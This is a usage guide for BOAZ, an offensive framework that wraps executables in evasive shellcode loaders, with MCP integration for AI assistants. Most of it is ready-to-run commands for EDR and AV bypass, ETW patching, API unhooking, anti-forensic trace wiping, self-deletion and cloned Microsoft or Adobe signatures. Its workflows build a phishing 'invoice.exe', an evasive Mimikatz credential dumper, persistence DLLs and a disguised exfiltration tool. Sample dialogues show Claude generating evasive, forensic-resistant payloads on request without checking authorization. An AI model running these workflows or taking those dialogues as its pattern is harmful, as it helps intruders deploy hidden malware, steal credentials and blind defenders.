# BOAZ Usage Guide

Comprehensive usage examples and workflows for BOAZ MCP integration.

## Table of Contents

- [Basic Usage](#basic-usage)
- [Command Reference](#command-reference)
- [Encoding Schemes](#encoding-schemes)
- [Loader Selection](#loader-selection)
- [Compiler Options](#compiler-options)
- [Advanced Features](#advanced-features)
- [Common Workflows](#common-workflows)
- [MCP Integration](#mcp-integration)
- [Best Practices](#best-practices)
- [Examples by Use Case](#examples-by-use-case)

## Basic Usage

### Minimal Example

```bash
# Basic payload generation with defaults
python3 Boaz.py -f input.exe -o output.exe

# Equivalent to:
python3 Boaz.py -f input.exe -o output.exe -t donut -l 1 -c mingw
```

### Recommended Starting Point

```bash
# Good balance of evasion and reliability
python3 Boaz.py \
  -f payload.exe \
  -o evasive.exe \
  -t donut \
  -l 16 \
  -e uuid \
  -c akira \
  -obf
```

### Display Help

```bash
# Show all options
python3 Boaz.py -h

# Show loader descriptions
python3 Boaz.py -h | grep -A 100 "loader modules"
```

## Command Reference

### Required Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `-f, --input-file` | Path to input PE executable | `-f payload.exe` |
| `-o, --output-file` | Path for output executable | `-o output.exe` |

### Shellcode Generation

| Argument | Options | Description |
|----------|---------|-------------|
| `-t, --shellcode-type` | `donut`, `pe2sh`, `rc4`, `amber`, `shoggoth`, `augment` | Shellcode converter (default: `donut`) |
| `-sd, --star-dust` | Flag | Use Stardust for .bin input files |
| `-sgn, --encode-sgn` | Flag | Apply Shikata Ga Nai encoding |

### Encoding Options

| Argument | Options | Description |
|----------|---------|-------------|
| `-e, --encoding` | `uuid`, `xor`, `mac`, `ipv4`, `base45`, `base64`, `base58`, `aes`, `des`, `chacha`, `rc4`, `aes2` | Payload encoding scheme |
| `-divide` | Flag | Enable divide and conquer for AES2 encoding |

### Loader Selection

| Argument | Description | Example |
|----------|-------------|---------|
| `-l, --loader` | Loader number (1-77+) | `-l 37` |

### Compilation Options

| Argument | Options | Description |
|----------|---------|-------------|
| `-c, --compiler` | `mingw`, `pluto`, `akira` | Compiler choice (default: `mingw`) |
| `-mllvm` | LLVM passes | Custom LLVM obfuscation passes |

### Obfuscation Features

| Argument | Description |
|----------|-------------|
| `-obf, --obfuscate` | Enable source code obfuscation |
| `-obf_api, --obfuscate-api` | Obfuscate API calls (ntdll, kernel32) |

### Anti-Analysis Features

| Argument | Description |
|----------|-------------|
| `-a, --anti-emulation` | Enable anti-emulation checks |
| `-sleep` | Add random sleep obfuscation |
| `-dream [TIME]` | Stack-encrypted sleep (ms, default: 1500) |
| `-j, --junk-api` | Insert benign junk API calls |

### API Techniques

| Argument | Description |
|----------|-------------|
| `-u, --api-unhooking` | Enable API unhooking |
| `-g, --god-speed` | Advanced unhooking (Peruns Fart) |
| `-w, --syswhisper [1\|2]` | Direct syscalls (1: random jumps, 2: MingW+NASM) |
| `-etw` | ETW patching |

### Output Format

| Argument | Description |
|----------|-------------|
| `-dll` | Compile as DLL (use with rundll32) |
| `-cpl` | Compile as CPL (use with control.exe) |
| Default | Compile as EXE |

### Post-Processing

| Argument | Description |
|----------|-------------|
| `-entropy {1\|2}` | Reduce entropy (1: null bytes, 2: Pokemon names) |
| `-wm, --watermark [0\|1]` | Add/skip watermark (default: 1) |
| `-s, --sign-certificate` | Sign binary and copy metadata |
| `-icon` | Add icon to output binary |

### Security Features

| Argument | Description |
|----------|-------------|
| `-cfg, --control-flow-guard` | Disable CFG for loader |
| `-d, --self-deletion` | Enable self-deletion after execution |
| `-af, --anti-forensic` | Enable anti-forensic trace removal |

### Utilities

| Argument | Description |
|----------|-------------|
| `-b, --binder [PATH]` | Bind with utility (default: binder/calc.exe) |
| `-dh, --detect-hooks` | Compile hook detection tool |

## Encoding Schemes

### UUID Encoding

Converts payload to UUID format, evading signature-based detection.

```bash
python3 Boaz.py -f payload.exe -o output.exe -e uuid
```

**Characteristics**:
- Low entropy
- Legitimate-looking format
- Compatible with most loaders

### XOR Encoding

Simple XOR encryption with random key.

```bash
python3 Boaz.py -f payload.exe -o output.exe -e xor
```

**Characteristics**:
- Fast decryption
- Lightweight
- May trigger entropy-based detection

### MAC Address Encoding

Payload encoded as MAC addresses.

```bash
python3 Boaz.py -f payload.exe -o output.exe -e mac -l 31
```

**Characteristics**:
- Network-related obfuscation
- Evades string-based signatures
- Requires compatible loader (31)

### AES Encryption

Strong AES encryption with runtime decryption.

```bash
python3 Boaz.py -f payload.exe -o output.exe -e aes
```

**Characteristics**:
- Strong encryption
- Higher entropy
- Slower decryption

### AES2 (Divide & Conquer)

AES with divided decryption to bypass logical path hijacking.

```bash
python3 Boaz.py -f payload.exe -o output.exe -e aes2 -l 11
```

**Characteristics**:
- Evades emulator logical path detection
- Compatible with specific loaders (11, 17)
- Enhanced anti-analysis

### ChaCha20 Encryption

Modern stream cipher encryption.

```bash
python3 Boaz.py -f payload.exe -o output.exe -e chacha
```

**Characteristics**:
- Fast encryption/decryption
- Strong security
- Less commonly fingerprinted

### IPv4 Encoding

Payload encoded as IPv4 addresses.

```bash
python3 Boaz.py -f payload.exe -o output.exe -e ipv4
```

**Characteristics**:
- Network-themed obfuscation
- Low suspicion format
- Moderate decoding overhead

### Base Encodings (Base45/64/58)

Standard base encoding schemes.

```bash
# Base64 (most common)
python3 Boaz.py -f payload.exe -o output.exe -e base64

# Base58 (Bitcoin-style)
python3 Boaz.py -f payload.exe -o output.exe -e base58

# Base45 (less common)
python3 Boaz.py -f payload.exe -o output.exe -e base45
```

## Loader Selection

### Category: Classic Syscalls (1-11)

**Loader 1**: Proxy syscall with custom call stack and threadless execution
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 1 -e uuid
```
- Use case: Advanced local injection
- Features: Custom call stack, indirect syscalls, no thread creation

**Loader 3**: Sifu syscall
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 3 -e aes
```
- Use case: Syscall-based injection
- Features: Direct syscalls, low detection rate

**Loader 4**: UUID manual injection
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 4 -e uuid
```
- Use case: UUID-encoded payload injection
- Features: Requires UUID encoding

### Category: Classic Userland (15-18)

**Loader 16**: Classic API calls (VirtualAlloc + WriteProcessMemory + CreateRemoteThread)
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 16
```
- Use case: Standard remote injection
- Features: Most compatible, well-tested

**Loader 18**: WriteProcessMemoryAPC
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 18 -e aes
```
- Use case: APC-based injection
- Features: Alternative execution method

### Category: Stealth Injection (19-41)

**Loader 37**: Stealth loader with memory scan evasion
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 37 -e aes -c akira
```
- Use case: High-security environments
- Features: Advanced memory scan evasion, custom module loading

**Loader 38**: APC write with phantom DLL overloading
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 38 -e chacha
```
- Use case: Novel injection technique
- Features: DLL overloading, stealthy execution

### Category: Memory Guard Loaders (48-69)

**Loader 48**: Sifu breakpoint handler (NtResumeThread hook)
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 48 -e aes
```
- Use case: Memory guard evasion
- Features: Hardware breakpoint-based execution

**Loader 51**: Advanced breakpoint handler (RtlUserThreadStart hook)
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 51 -e rc4
```
- Use case: Advanced memory protection bypass
- Features: Multiple hook points, PAGE_NOACCESS, encryption

**Loader 57**: RC4-encrypted memory guard
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 57 -e uuid
```
- Use case: Encrypted memory with system APIs
- Features: SystemFunction032/033 for RC4

### Category: VEH/VCH Execution (58-69)

**Loader 61**: Page guard VEH/VCH execution
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 61 -e aes
```
- Use case: Exception-based execution
- Features: No register/stack manipulation in VEH

**Loader 69**: Manual VEH/VCH with PEB cleanup
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 69 -e chacha
```
- Use case: Stealthiest execution method
- Features: Manual handler setup, PEB flag removal

### Category: Threadless Injection (73-77)

**Loader 73**: Virtual table pointer threadless injection
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 73 -e aes
```
- Use case: No thread creation
- Features: VT hijacking, decoy address, memory guard

**Loader 75**: .NET JIT threadless injection
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 75
```
- Use case: .NET environment targeting
- Features: JIT compilation hijacking

**Loader 77**: RtlCreateHeap VT pointer injection
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 77 -e rc4
```
- Use case: Alternative VT hijacking
- Features: Heap-based VT manipulation

## Compiler Options

### MinGW (Default)

Standard cross-compilation without obfuscation.

```bash
python3 Boaz.py -f payload.exe -o output.exe -c mingw
```

**Use when**:
- Testing functionality
- Maximum compatibility needed
- Obfuscation not required

### Pluto LLVM Obfuscator

IR-level obfuscation with multiple passes.

```bash
# Default Pluto passes
python3 Boaz.py -f payload.exe -o output.exe -c pluto

# Custom passes
python3 Boaz.py -f payload.exe -o output.exe -c pluto \
  -mllvm "mba,sub,bcf,fla,gle"
```

**Available Passes**:
- `bcf`: Bogus Control Flow
- `fla`: Control Flow Flattening
- `gle`: Global Variable Encryption
- `mba`: Mixed-Boolean Arithmetic
- `sub`: Instruction Substitution
- `idc`: Indirect Call Promotion
- `hlw`: Hide LLVM Warnings

**Use when**:
- Strong obfuscation needed
- Control flow analysis resistance required
- Performance is acceptable

### Akira LLVM Obfuscator

Advanced IR-level obfuscation with enhanced features.

```bash
# Default Akira obfuscation
python3 Boaz.py -f payload.exe -o output.exe -c akira

# Custom obfuscation
python3 Boaz.py -f payload.exe -o output.exe -c akira \
  -mllvm "irobf-indbr,irobf-icall,irobf-indgv,irobf-cse,irobf-cff"
```

**Available Passes**:
- `irobf-indbr`: Indirect jumps with encrypted targets
- `irobf-icall`: Encrypted indirect function calls
- `irobf-indgv`: Encrypted global variable references
- `irobf-cse`: Control flow obfuscation
- `irobf-cff`: Procedure control flow flattening

**Use when**:
- Maximum obfuscation required
- Static analysis resistance critical
- String encryption needed

## Advanced Features

### Sleep Obfuscation

#### Random Sleep
```bash
python3 Boaz.py -f payload.exe -o output.exe -sleep
```
- Random sleep time at execution
- Evades time-based emulation

#### Encrypted Stack Sleep (Dream)
```bash
# Default 1500ms
python3 Boaz.py -f payload.exe -o output.exe -dream

# Custom duration
python3 Boaz.py -f payload.exe -o output.exe -dream 3000
```
- Stack encryption during sleep
- Evades memory scanning during sleep

### API Unhooking

#### Standard Unhooking
```bash
python3 Boaz.py -f payload.exe -o output.exe -u
```
- Reads clean syscall stubs from disk
- Rewrites hooked ntdll functions

#### Advanced Unhooking (Peruns Fart)
```bash
python3 Boaz.py -f payload.exe -o output.exe -g
```
- Custom Peruns Fart implementation
- More sophisticated unhooking

#### Halo's Gate
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 27
```
- Syscall stub patching
- Works with specific loaders (27, 28, etc.)

### ETW Bypass

#### Hot Patch Method
```bash
python3 Boaz.py -f payload.exe -o output.exe -etw
```
- Patches NtTraceEvent with `xor rax, rax; ret`
- Fast and effective

#### Patchless Method
```bash
python3 Boaz.py -f payload.exe -o output.exe -l 48
```
- Uses VEH and HWBP
- No code modification
- Available in loaders 48-69

### Control Flow Guard

#### Disable CFG
```bash
python3 Boaz.py -f payload.exe -o output.exe -cfg
```
- Disables Windows CFG
- Required for some advanced techniques

### Self-Deletion

```bash
python3 Boaz.py -f payload.exe -o output.exe -d
```
- Binary deletes itself after execution
- Anti-forensic measure

### Anti-Forensic Cleanup

```bash
python3 Boaz.py -f payload.exe -o output.exe -af
```
- Removes execution traces
- Modifies registry timestamps
- Clears AmCache and ShimCache
- Copies NTFS timestamps

### Binary Signing

#### Interactive Mode
```bash
python3 Boaz.py -f payload.exe -o output.exe -s
# Will prompt for options
```

#### Carbon Copy (Clone from website)
```bash
python3 Boaz.py -f payload.exe -o output.exe -s www.microsoft.com
```

#### MetaTwin (Clone from file)
```bash
python3 Boaz.py -f payload.exe -o output.exe -s /path/to/signed.exe
```

### Entropy Reduction

#### Null Byte Padding
```bash
python3 Boaz.py -f payload.exe -o output.exe -entropy 1
```
- Pads with null bytes
- Reduces entropy quickly

#### Pokemon Names Padding
```bash
python3 Boaz.py -f payload.exe -o output.exe -entropy 2
```
- Pads with Pokemon names
- More natural-looking entropy

### Output Formats

#### DLL (Side-Loading)
```bash
python3 Boaz.py -f payload.exe -o malicious.dll -dll

# Execute with:
# rundll32.exe malicious.dll,DllMain
```

#### CPL (Control Panel)
```bash
python3 Boaz.py -f payload.exe -o malicious.cpl -cpl

# Execute with:
# control.exe malicious.cpl
```

## Common Workflows

### Workflow 1: Testing Payload Functionality

```bash
# Minimal obfuscation for testing
python3 Boaz.py \
  -f test_payload.exe \
  -o test_output.exe \
  -t donut \
  -l 16 \
  -c mingw
```

### Workflow 2: Evading Basic AV

```bash
# Basic evasion with UUID encoding
python3 Boaz.py \
  -f payload.exe \
  -o evasive.exe \
  -t donut \
  -l 16 \
  -e uuid \
  -obf \
  -entropy 2
```

### Workflow 3: Bypassing EDR

```bash
# Advanced evasion with syscalls and obfuscation
python3 Boaz.py \
  -f beacon.exe \
  -o edr_bypass.exe \
  -t donut \
  -l 37 \
  -e aes \
  -c akira \
  -obf \
  -obf_api \
  -u \
  -etw \
  -cfg \
  -a \
  -dream 2000
```

### Workflow 4: Memory Scanner Evasion

```bash
# Memory guard with encryption
python3 Boaz.py \
  -f implant.exe \
  -o mem_safe.exe \
  -t donut \
  -l 51 \
  -e rc4 \
  -c pluto \
  -obf \
  -dream 3000
```

### Workflow 5: Forensic-Resistant Payload

```bash
# Self-deleting with anti-forensics
python3 Boaz.py \
  -f payload.exe \
  -o forensic_safe.exe \
  -t donut \
  -l 37 \
  -e chacha \
  -c akira \
  -d \
  -af \
  -entropy 2 \
  -s www.microsoft.com
```

### Workflow 6: DLL Side-Loading

```bash
# Create malicious DLL
python3 Boaz.py \
  -f payload.exe \
  -o version.dll \
  -dll \
  -l 48 \
  -e aes \
  -c pluto \
  -obf_api \
  -u
```

### Workflow 7: Threadless Injection

```bash
# VT pointer hijacking
python3 Boaz.py \
  -f shellcode.bin \
  -sd \
  -o threadless.exe \
  -l 73 \
  -e aes \
  -c akira \
  -dream 2000
```

### Workflow 8: Maximum Evasion

```bash
# All evasion features enabled
python3 Boaz.py \
  -f payload.exe \
  -o max_evasion.exe \
  -t donut \
  -l 69 \
  -e aes2 \
  -c akira \
  -mllvm "irobf-indbr,irobf-icall,irobf-indgv,irobf-cff" \
  -obf \
  -obf_api \
  -a \
  -sleep \
  -dream 3000 \
  -j \
  -g \
  -etw \
  -cfg \
  -d \
  -af \
  -entropy 2 \
  -s www.microsoft.com \
  -icon
```

## MCP Integration

### Using BOAZ with AI Assistants

Once configured, you can interact with BOAZ through Claude:

#### Example Conversation 1: Basic Payload Generation

```
User: Generate an evasive payload from payload.exe using loader 37 with AES encryption

Claude: I'll use the BOAZ generate_payload tool to create an evasive payload.
[Calls generate_payload tool with appropriate parameters]
```

#### Example Conversation 2: Loader Selection

```
User: What loader should I use for memory scanner evasion?

Claude: Let me check the available loaders.
[Calls list_loaders tool]

Based on the loaders, I recommend:
- Loader 48: Basic Sifu breakpoint handler
- Loader 51: Advanced with multiple hooks
- Loader 61: VEH/VCH execution
- Loader 69: Most advanced with PEB cleanup
```

#### Example Conversation 3: Complex Workflow

```
User: Create a forensic-resistant payload that evades EDR

Claude: I'll generate a payload with comprehensive evasion:
- Loader 37 (stealth injection)
- AES encryption
- Akira obfuscation
- Self-deletion
- Anti-forensic cleanup
- Signed certificate

[Calls generate_payload with full configuration]
```

### MCP Tool Usage

#### Generate Payload
```python
# Through MCP interface
{
  "tool": "generate_payload",
  "arguments": {
    "input_file": "/path/to/payload.exe",
    "output_file": "/path/to/output.exe",
    "loader": 37,
    "encoding": "aes",
    "compiler": "akira",
    "options": {
      "obfuscate": true,
      "anti_emulation": true,
      "etw": true
    }
  }
}
```

#### List Loaders
```python
{
  "tool": "list_loaders",
  "arguments": {
    "category": "memory_guard"  # Optional filter
  }
}
```

#### Analyze Binary
```python
{
  "tool": "analyze_binary",
  "arguments": {
    "file_path": "/path/to/binary.exe"
  }
}
```

## Best Practices

### Operational Security

1. **Isolated Environment**: Always test in isolated VMs
2. **Authorization**: Obtain written permission before use
3. **Documentation**: Document all testing activities
4. **Cleanup**: Remove test artifacts after engagements

### Evasion Strategy

1. **Start Simple**: Test with minimal evasion first
2. **Incremental Enhancement**: Add features based on detection
3. **Loader Selection**: Choose appropriate loader for target
4. **Encoding Choice**: Match encoding to loader capabilities

### Performance Considerations

1. **LLVM Obfuscation**: Increases compilation time significantly
2. **Sleep Duration**: Balance evasion vs. execution speed
3. **Encoding Overhead**: More complex encoding = slower runtime

### Testing Workflow

```bash
# 1. Test basic functionality
python3 Boaz.py -f payload.exe -o test1.exe -l 16

# 2. Add encoding
python3 Boaz.py -f payload.exe -o test2.exe -l 16 -e uuid

# 3. Add obfuscation
python3 Boaz.py -f payload.exe -o test3.exe -l 16 -e uuid -c akira

# 4. Add anti-analysis
python3 Boaz.py -f payload.exe -o test4.exe -l 37 -e aes -c akira -a -etw

# 5. Final hardening
python3 Boaz.py -f payload.exe -o final.exe -l 37 -e aes -c akira -a -etw -d -af
```

## Examples by Use Case

### Red Team Initial Access

```bash
# Phishing payload with social engineering
python3 Boaz.py \
  -f beacon.exe \
  -o invoice.exe \
  -t donut \
  -l 16 \
  -e uuid \
  -c akira \
  -obf \
  -entropy 2 \
  -s www.adobe.com \
  -icon
```

### Post-Exploitation Tool

```bash
# Mimikatz with maximum evasion
python3 Boaz.py \
  -f mimikatz.exe \
  -o credential_dump.exe \
  -t donut \
  -l 51 \
  -e aes \
  -c akira \
  -obf \
  -obf_api \
  -g \
  -etw \
  -cfg \
  -d \
  -af
```

### Lateral Movement

```bash
# Remote injection DLL
python3 Boaz.py \
  -f lateral.exe \
  -o wmi_provider.dll \
  -dll \
  -l 38 \
  -e chacha \
  -c pluto \
  -u \
  -dream 1000
```

### Persistence Mechanism

```bash
# Service DLL with stealth
python3 Boaz.py \
  -f persistence.exe \
  -o service.dll \
  -dll \
  -l 48 \
  -e rc4 \
  -c akira \
  -obf \
  -a \
  -af
```

### Data Exfiltration

```bash
# Self-deleting exfiltration tool
python3 Boaz.py \
  -f exfil.exe \
  -o backup_utility.exe \
  -t donut \
  -l 37 \
  -e aes \
  -c pluto \
  -d \
  -af \
  -s www.microsoft.com
```

## Troubleshooting

### Common Issues

**Output doesn't execute**:
- Check Wine compatibility: `wine output.exe`
- Verify encoding matches loader
- Test with simpler loader (16)

**Detection by AV**:
- Increase obfuscation: Add `-c akira`
- Change loader: Try advanced loader (37, 51)
- Add anti-analysis: `-a -etw -cfg`
- Reduce entropy: `-entropy 2`

**Compilation errors**:
- Check LLVM installation
- Try different compiler: `-c mingw`
- Verify input file is valid PE

**Runtime crashes**:
- Test without encoding first
- Verify loader compatibility
- Check for bad characters (avoid `-sgn` initially)

## Next Steps

- Review [API.md](API.md) for detailed MCP tool reference
- Consult loader-specific documentation for advanced features
- Join BOAZ community for latest techniques and updates

---

**Remember**: This tool is for authorized security testing only. Always obtain proper authorization and follow responsible disclosure practices.
